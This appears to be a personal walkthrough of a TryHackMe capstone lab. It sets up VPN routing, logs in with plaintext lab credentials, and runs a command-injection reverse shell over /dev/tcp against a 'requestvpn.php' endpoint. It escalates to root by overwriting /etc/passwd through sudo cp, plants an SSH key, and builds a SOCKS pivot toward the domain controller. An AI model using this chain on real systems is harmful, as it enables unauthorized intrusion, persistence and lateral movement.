# Modify and connect the ovpn
```bash
ip a
11: capstone: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 10.50.50.170/24 scope global capstone
       valid_lft forever preferred_lft forever
    inet6 fe80::7e0e:b09d:91f1:64d6/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever
12: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 12.100.1.9/24 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 fe80::bac5:cf03:b243:de6d/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever
```

It works under the capstone network vpn only.

To perform a ping sweep on the IP range 12.100.1.0/24 (which includes addresses from 12.100.1.0 to 12.100.1.255), you can use the following one-line bash script:

```bash
for ip in 12.100.1.{1..255}; do ping -c 1 -W 1 $ip >/dev/null && echo "$ip is up"; done

12.100.1.1 is up <- !
12.100.1.9 is up
```

* https://unix.stackexchange.com/questions/16500/how-to-refuse-routes-that-are-pushed-by-openvpn-server
* https://openvpn.net/community-resources/setting-up-routing/

### Update the ovpn file
```ovpn
remote 10.200.52.12 1194
pull-filter ignore "route 172."
route 10.200.52.21 255.255.255.255 12.100.1.1
route 10.200.52.22 255.255.255.255 12.100.1.1
```

```bash
sudo openvpn corpUsername.ovpn

2023-05-31 15:39:22 TUN/TAP device tun0 opened
2023-05-31 15:39:22 net_iface_mtu_set: mtu 1500 for tun0
2023-05-31 15:39:22 net_iface_up: set tun0 up
2023-05-31 15:39:22 net_addr_v4_add: 12.100.1.9/24 dev tun0
2023-05-31 15:39:22 net_route_v4_add: 10.200.52.21/32 via 12.100.1.1 dev [NULL] table 0 metric 1000
2023-05-31 15:39:22 net_route_v4_add: 10.200.52.22/32 via 12.100.1.1 dev [NULL] table 0 metric 1000
```


# Generate new ovpn
Login with the creds first:
```txt
laura.wood@corp.thereserve.loc Password1@
mohammad.ahmed@corp.thereserve.loc Password1!
```

It prevents you from kicking out by having your own ovpn file.
# Hack the VPN server instead of using ovpn
Login with the creds first. This way is more stable to get DC. Chisel from WRK1 to DC also doable, but not as stable as ssh tunneling since that's under rdp.

### Command Injection
```bash burp
GET /requestvpn.php?filename=qwer%40corp.thereserve.loc+%26%26+bash+-i+>%26+/dev/tcp/10.50.110.158/80+0>%261 HTTP/1.1
```

### Privilege Escalation via cp

https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/

##### Kali
```bash
openssl passwd -1 -salt ignite pass123
$1$ignite$3eTbJm98O9Hz.k1NTdNxe1
```

##### Victim (VPN server)
```bash
www-data@ip-10-200-113-12:/tmp$ sudo -l
sudo -l
Matching Defaults entries for www-data on ip-10-200-113-12:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-200-113-12:
    (root) NOPASSWD: /home/ubuntu/openvpn-createuser.sh, /bin/cp
www-data@ip-10-200-113-12:/tmp$ sudo /bin/cp passwd /etc/passwd
sudo /bin/cp passwd /etc/passwd
www-data@ip-10-200-113-12:/tmp$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<mp$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ip-10-200-113-12:/tmp$ su baturu
su baturu
Password: pass123

root@ip-10-200-113-12:/tmp# whoami
whoami
root
```
### SSH as root
```bash
# grab the pub
ssh-keygen -t rsa -b 4096 -C "baturu@thm.com"

echo "ssh-rsa public id_rsa_pub baturu@thm.com" >> authorized_keys
```
### Setup SSH Pivoting
```bash
ssh -D 1085 root@$IP -i id_rsa
```

```conf
# Change to 1085 for THM Capstone
# socks4 	127.0.0.1 1085
socks5 	127.0.0.1 1085
```
-> Go to DC after pivoting